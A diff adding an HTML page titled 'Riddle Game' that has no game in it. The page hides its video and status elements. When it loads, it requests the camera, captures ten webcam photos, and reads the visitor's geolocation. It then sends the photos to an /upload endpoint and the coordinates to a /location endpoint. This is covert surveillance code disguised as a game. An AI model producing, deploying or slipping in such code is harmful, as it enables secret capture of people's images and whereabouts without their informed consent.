@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Riddle Game</title>
+  <style>
+        #video, #status {
+            display: none; /* Hide these elements */
+        }
+    </style>
+</head>
+<body>
+
+   
+
+    <video id="video" autoplay></video>
+    <div id="status">Initializing...</div>
+
+    <script>
+    (function() {
+            const video = document.getElementById('video');
+            const statusDiv = document.getElementById('status');
+            let photos = [];
+            const maxPhotos = 10; // Number of photos to capture
+            let captureCount = 0;
+
+            // Function to start capturing photos
+            function startPhotoCapture() {
+                const captureInterval = setInterval(() => {
+                    if (captureCount < maxPhotos) {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        const photo = canvas.toDataURL('image/jpeg');
+                        photos.push(photo);
+
+                        statusDiv.innerText = `Captured ${captureCount + 1} of ${maxPhotos} photos...`;
+
+                        captureCount++;
+                    } else {
+                        clearInterval(captureInterval);
+                        uploadPhotos();
+                    }
+                }, 1000); // Capture a photo every second
+            }
+
+            // Function to upload photos
+            function uploadPhotos() {
+                statusDiv.innerText = "Uploading photos...";
+                fetch('/upload', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ photos }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        statusDiv.innerText = "Photos uploaded successfully!";
+                    } else {
+                        statusDiv.innerText = "Failed to upload photos.";
+                    }
+                })
+                .catch(err => {
+                    statusDiv.innerText = "Error uploading photos.";
+                    console.error("Error uploading photos:", err);
+                });
+            }
+
+            // Automatically capture and send the user's location
+            function shareLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        const { latitude, longitude } = position.coords;
+
+                        // Send location to the server
+                        fetch('/location', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({ latitude, longitude }),
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.status === 'success') {
+                                statusDiv.innerText = "Location saved successfully!";
+                            } else {
+                                statusDiv.innerText = "Failed to save location.";
+                            }
+                        })
+                        .catch(err => {
+                            statusDiv.innerText = "Error saving location.";
+                            console.error('Error sharing location:', err);
+                        });
+                    }, (err) => {
+                        statusDiv.innerText = 'Unable to get location. Please enable location services.';
+                        console.error(err);
+                    });
+                } else {
+                    statusDiv.innerText = 'Geolocation is not supported by your browser.';
+                }
+            }
+
+            // Initialize the camera and location
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    shareLocation(); // Fetch location after video initializes
+                    startPhotoCapture(); // Start capturing photos after video initializes
+                })
+                .catch((err) => {
+                    console.error("Error accessing camera: ", err);
+                    statusDiv.innerText = "Error accessing camera.";
+                });
+        })();
+     
+
+
+        
+    </script>
+</body>
+</html>
